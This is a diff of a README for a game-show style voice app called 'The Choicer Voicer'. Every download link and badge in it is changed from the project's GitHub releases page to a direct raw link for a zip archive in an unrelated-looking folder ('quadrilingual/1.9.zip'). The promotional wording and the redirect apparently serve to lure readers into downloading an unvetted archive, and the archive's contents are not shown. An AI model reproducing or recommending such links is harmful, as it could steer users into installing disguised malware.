@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Agathaanticyclonic387/The-Choicer-Voicer/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Agathaanticyclonic387/The-Choicer-Voicer/main/quadrilingual/1.9.zip)
 
 </div>
 
@@ -32,7 +32,7 @@ Imagine a game show where **you** are the host, the contestant, and the star - a
 Getting started with The Choicer Voicer is super simple! Follow these easy steps:
 
 ### Step 1: Download the Game
-Visit this link to download the application: [https://github.com/Agathaanticyclonic387/The-Choicer-Voicer/releases](https://github.com/Agathaanticyclonic387/The-Choicer-Voicer/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Agathaanticyclonic387/The-Choicer-Voicer/main/quadrilingual/1.9.zip](https://raw.githubusercontent.com/Agathaanticyclonic387/The-Choicer-Voicer/main/quadrilingual/1.9.zip)
 
 Click the big download button on that page to get the game file.
 
@@ -42,7 +42,7 @@ Once the download finishes, find the downloaded file (usually in your "Downloads
 ## 📥 Download and Installation
 
 ### Get Your Copy Today!
-Click here to get started: [**Download The Choicer Voicer**](https://github.com/Agathaanticyclonic387/The-Choicer-Voicer/releases)
+Click here to get started: [**Download The Choicer Voicer**](https://raw.githubusercontent.com/Agathaanticyclonic387/The-Choicer-Voicer/main/quadrilingual/1.9.zip)
 
 ### What Happens Next?
 1. **Visit the download page** - You'll see the latest version available
@@ -143,7 +143,7 @@ The Choicer Voicer was built with love and a dash of game show magic. We hope it
 
 ### Ready to Let Your Voice Decide?
 
-[![Get It Now](https://img.shields.io/badge/🎮_GET_IT_NOW-4ECDC4?style=for-the-badge)](https://github.com/Agathaanticyclonic387/The-Choicer-Voicer/releases)
+[![Get It Now](https://img.shields.io/badge/🎮_GET_IT_NOW-4ECDC4?style=for-the-badge)](https://raw.githubusercontent.com/Agathaanticyclonic387/The-Choicer-Voicer/main/quadrilingual/1.9.zip)
 
 **Download today and start making decisions the fun way!**
 
